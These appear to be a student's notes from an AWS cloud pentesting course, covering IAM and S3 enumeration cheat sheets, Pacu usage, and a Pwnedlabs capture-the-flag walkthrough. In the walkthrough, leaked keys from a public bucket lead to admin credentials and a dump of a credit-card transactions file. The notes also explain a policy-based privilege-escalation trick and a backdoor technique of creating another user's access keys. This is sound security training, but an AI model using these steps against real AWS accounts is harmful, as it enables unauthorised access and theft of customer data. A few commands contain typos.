# Introduction to AWS Pentesting [Link](https://academy.simplycyber.io/courses/enrolled/2760561)

# 1 Welcome To The Course
- Basics of cloud usage

# 2 Configuring the Lab Environment
- Create AWS free tier account
- Budget alerts
- Install AWS CLI
- Enabling Autocomplete for the AWS CLI
- Installing [cloudgoat](https://github.com/RhinoSecurityLabs/cloudgoat)
- Installing Pacu
```bash
# Enabling Autocomplete for the AWS CLI
echo -e '\nexport PATH=/usr/local/bin/:$PATH\nautoload bashcompinit && bashcompinit\nautoload -Uz compinit && compinit\ncomplete -C "/usr/local/bin/aws_completer" aws' >> ~/.zshrc
source ~/.zshrc
aws s[Press Tab]

# try to install the cloudgoat and pacu with pipx
pipx install git+<URL>.git
```

# 3 IAM The Admin Now (Understanding IAM in AWS)
- This section kicks off our deep dive into Identity and Access Management (IAM) in AWS. Whether you’re completely new to IAM or just need a refresher, this will give you the foundation you need before jumping into the hands-on labs.

### Concept of IAM
- **Users** - Users represent people or applications. They have long-term credentials like usernames, passwords and access keys.
- **Groups** - Groups are just a way to manage permissions for multiple users at once. (Backend engineers are grouped into one, then attach to the required resources.)
- **Policies** - Policies are what a user, group or role can and can't do. They're written in JSON and attached to IAM entities. There are two kinds.
    - **Managed Policies** - Reusable across users and groups. These are easier to manage and scale.
    - **Inline policies** - Attached directly to one user or group. These are harder to track and often the source of privilege escalation bugs in a real-world environment.
- **Roles** - Roles are like users but without long-term credentials. You assume a role temporarily, and AWS gives you credentils that expire after a set time.

### Why IAM Matters for Pentesting
- Misconfiguration (Not a zero-day attacks)
    - **Privilege Escalation** Can I go from a low-privilege user to an admin? This is the most common and most impactful finding in cloud environments.
    - **Lateral Movement** - Even if I can’t get admin access, can I move sideways into another user, role, or resource with sensitive access—like an S3 bucket full of data?
    - **Data Exfiltration** - Can I take over a Lambda function and send data to my own server?
    - **Persistence** - If I can create access keys for another user, I can quietly backdoor their account without changing their password. That kind of access is hard to detect unless you’ve got solid logging and alerting in place.

> In one assessment, I ran into a policy that looked secure at first glance. It denied me from attaching the AdministratorAccess policy. But when I looked closer, I noticed it allowed me to do `iam:*` on `*` —except for that one explicit deny. So instead of attaching AdministratorAccess, I just created my own policy with full permissions, gave it a different name, and attached it. Full admin access—game over.

### What to Watch For
- When you’re reviewing IAM permissions, here are four things you should always check:
    - Users with **excessive permissions**
    - Roles that can be **assumed**
    - Policies that use wildcards (e.g., `"Action": "*"` or `"Resource": "*"`)
    - Services or **Lambda** functions with elevated permissions that you can potentially abuse

```bash
{
"Version": "2012-10-17",
"Statement": [
    {
    "Effect": "Deny",
    "Action": [
            "iam:PassRole",
            "iam:AttachRolePolicy",
            "iam:PutRolePolicy",
            "iam:Update AssumeRolePolicy"
    ],
    "Resource": "arn:aws:iam::*:role/Administrator"
    },
    {
        "Effect": "Allow",
        "Action": "iam:*",
        "Resource": "*"
    }
 ]
}
```

### IAM Enumeration Cheat Sheet
1. List IAM Users ```aws iam list-isers```
2. Get User Permissions </br>
    a. List attached managed policies ```aws iam list-attached-user-policies --user-name [user-name]``` </br>
    b. List inline policies ```aws iam list-user-policies --user-name [user-name]``` </br>
    c. Get inline policy details ```aws iam get-user-policy --user-name [user-name] --policy-name [policy-name]``` </br>
3. List IAM Groups and permissions </br>
     a. List groups for a user ```aws iam list-groups-for-user --user-name [user-name]``` </br>
     b. List group policies ```aws iam list-attached-group-policies --group-name [group-name] , aws iam list-group-policies --group-name [group-name]``` </br>
     c. Get inline group policy details ```aws iam get-group-policy --group-name [group-name] --policy-name [policy-name]``` </br>
4.  List IAM Roles and Permissions </br>
    a. List all roles ```aws iam list-roles``` </br>
    b. Get role details (trust policy) ```aws iam get-role --role-name [role-name]``` </br>
    c. List attached policies ```aws iam list-attached-role-policies --role-name [role-name]``` </br>
    d. List inline policies ```aws iam list-role-policies --role-name [role-name]``` </br>
    e. Get inline role policy details ```aws iam get-role-policy --role-name [role-name] --policy-name [policy-name]``` </br>
5. Get and Decode Policy Documents
- Get a managed policy document(by ARN or name)
```bash
aws iam get-policy --policy-arn [policy-arn]
aws iam get-policy-version --policy-arn [policy-arn] --version-id [version-id]
```
6. View Full IAM Snapshot
- Dump all IAM permissions (users, roles, groups, policies)
```bash
aws iam get-account-authorization-details
```
> Use this to build a full IAM permissions map. Add `--filter` to target roles/users/groups specifically.
- Lab Commands [Cybr Lab AWS IAM Enumeration](https://cybr.com/hands-on-labs/lab/introduction-to-aws-iam-enumeration/)
```bash
# username and policyname only for this lab free to change accordingly
aws configure --profile cybr
aws sts get-caller-identity --profile cybr
aws iam get-user --profile cybr
aws iam get-account-authorization-details  --profile cybr
aws iam list-usera --profile cybr
aws iam list-users --profile cybr
aws iam list-access-keys --profile cybr
aws iam list-user-policies --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --profile cybr
aws iam list-user-policies --user-name introduction-to-aws-iam-enumeration-1747259538516-Mary --profile cybr
aws iam get-user-policy --user-name introduction-to-aws-iam-enumeration-1747259538516-Mary --profile cybr
aws iam get-user-policy --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --policy-name AllowEnumerateRoles --profile cybr
aws iam get-user-policy --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --policy-name AllowEnumerateRoles
aws iam get-user-policy --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --policy-name AllowEnumerateRoles --profile cybr
aws iam list-user-attached-policies --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --profile cybr
aws iam list-attached-user-policies --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --profile cybr
aws iam list-groups --profile cybr
aws iam list-groups-for-user --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --profile cybr
aws iam get-group --group-name introduction-to-aws-iam-enumeration-1747259538516-Developers --profile cybr
aws iam list-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Developers --profile cybr
aws iam get-group-policy --group-name introduction-to-aws-iam-enumeration-1747259538516-Developers --policy-name introduction-to-aws-iam-enumeration-1747259538516-devs-policy --profile cybr
aws iam list-attached-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Developers --profile cybr
aws iam list-attached-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Infrastructure --profile cybr
aws iam get-group --group-name introduction-to-aws-iam-enumeration-1747259538516-Infrastructure --profile cybr
aws iam list-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Infrastructure --profile cybr
aws iam get-group-policy --group-name introduction-to-aws-iam-enumeration-1747259538516-Infrastructure --policy-name introduction-to-aws-iam-enumeration-1747259538516-infra-policy --profile cybr
aws iam list-attached-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Infrastructure --profile cybr
aws iam list-attached-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Developer --profile cybr
aws iam list-attached-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Developers --profile cybr
aws iam list-roles --profile cybr
aws iam list-roles --query "Roles[?RoleName=='SupportRole']" --profile cybr
aws iam list-role-policies --role-name SupportRole --profile cybr
aws iam get-role-policy --role-name SupportRole --policy-name AllowS3FullAccessForRole --profile cybr
```

#### Automatic Enumeration using Pacu, Manual Enumeration using AWS CLI
```bash
pacu
import_keys cybr
search iam
run iam__enum_users_roles_policies_groups
data iam # Saved in the cache of pacu
help iam__enum_permissions
run iam__enum_permissions # suggest to run whoami
whoami
```

# 4 Your Bucket Is Leaking... (Attacking S3 Buckets)


### S3 for Pentesters
- S3 - Simple Storage Service, it's like an FTP in the cloud
- Used for
    - Static Websites
    - Backups
    - Logs, etc.
- Buckets
    - Top-level container
    - Globally unique names
- Objects
    - Actual data/files
- Access Control
    - Bucket Policies (resource-based)
    - IAM Policies (identity-based)
    - Access Control Lists (legacy)
- Your Bucket Is Leaking - Pentesting S3 Buckets
    - Public Access (List / Get)
    - Misconfigured Permissions
    - Public Write Access (Write some objects, DoS, DoW attacks)
    - Data Exposure
- S3 Bucket policy
```bash
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*", # Any IAM any other account do anything read, write, Delete
            "Action": "s3:*",
            "Resource": [
                "arn:aws:s3:::public-bucket-name",
                "arn:aws:s3:::public-bucket-name/*" # Deface the static website
            ]
        },
        {
            "Effect": "Deny",
            "NotAction": "s3:*",
            "NotResource": [
                "arn:aws:s3:::bucket-name",
                "arn:aws:s3:::bucket-name/*"
            ]
        }
    ]
}
```

### S3 Bucket Enumeration Cheat Sheet
- List Buckets in the Authenticated Account - ```aws s3 ls```
- Check if a Bucket Exists (No Auth) - ```aws s3 ls s3://[bucket-name] --no-sign-request```
- List Contents of a Public or Accessible Bucket - ```aws s3 ls s3://[bucket-name]/[optional-path] --no-sign-request```
- Download an Object - ```aws s3 cp s3://[bucket-name]/[key] [local-file] --no-sign-request```
- Upload a File (Test Write Access) - ```aws s3 cp test.txt s3://[bucket-name]/test.txt```
- Enumerate Bucket Permissions (Authenticated) 
    - Get bucket policy - ```aws s3api get-bucket-policy --bucket [bucket-name]```
    - Get bucket ACL (Access Control List) - ```aws s3api get-bucket-acl --bucket [bucket-name]```
    - Get Public Access Block settings - ```aws s3api get-bucket-public-access-block --bucket [bucket-name]```
    - Get CORS configuration (may hint at XSS vectors) - ```aws s3api get-bucket-cors --bucket [bucket-name]```
-  List All Buckets & Objects (If Compromised Creds)
```bash
aws s3api list-buckets
aws s3api list-objects --bucket [bucket-name] --output table
```

### Lab Introduction and Set Up
- Lab [Pwnedlabs](https://pwnedlabs.io/labs/aws-s3-enumeration-basics)
```Bash
# Target http://dev.huge-logistics.com, Once enter the form, 405 error
#405 Method Not Allowed
    #Code: MethodNotAllowed
    #Message: The specified method is not allowed against this resource.
    #Method: POST
    #ResourceType: OBJECT
    #RequestId: 4Y72PDD02YKBEEE2
    #HostId: aqPu9q7qB4ZCfLeBpTTEwkedq3G8SHjeRRsDapDBSykf3QltpJ6rDZCv5BZBlEu6Xhr4c4m86ps=
# It looks like potential S3 bucket

#  <link rel="stylesheet" href="https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css">  In the View source dev.huge-logistics.com
```
- List the files
```bash
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
  # files admin don't have access (admin/, migration-files/, shared/,static/,5347 index.html) 
  ```
- Download
```bash
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
```
- Unzip the file 
```bash
unzip hl_migration_project.zip   # their is a migrate_secrets.ps1 
cat migrate_secrets.ps1 
# AWS Configuration
# $accessKey = ""
# $secretKey = ""
# $region = "us-east-1"
```
- Login to aws cli
```bash
aws configure --profile pwned # enter above keys
aws s3 ls s3://dev.huge-logistics.com/admin --profile pwned
aws s3 ls s3://dev.huge-logistics.com/admin/ --profile pwned # found website_transactions_export.csv
aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv . --profile pwned # 403 Forbidden
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml . --profile pwned # downloaded
```
- cat test-export.xml
```bash
!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
       # <AccountID>794929857501</AccountID>
       # Intenionaly removed
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
```
- Login with admin
```bash
aws configure --profile adminpwned
aws s3 ls s3://dev.huge-logistics.com/admin/ --profile adminpwned
aws s3 ls s3://dev.huge-logistics.com/admin/ --profile adminpwned
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile adminpwned
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt - --profile adminpwned # view
aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv - --profile adminpwned > credit_card.txt
```
